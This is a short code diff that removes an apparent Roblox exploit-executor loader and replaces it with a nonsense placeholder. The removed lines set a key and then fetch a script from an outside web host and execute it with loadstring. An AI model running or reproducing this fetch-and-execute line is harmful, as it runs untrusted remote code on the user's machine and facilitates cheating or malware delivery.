@@ -1,2 +1,1 @@
-_G.key = "0a802b0b-99ea-41dd-911f-d1f87c4c99ab"
-loadstring((request or http_request or syn and syn.request)({Url='https://blissfuls.world/westx/script',Method='GET'}).Body)()
+awodawdawd
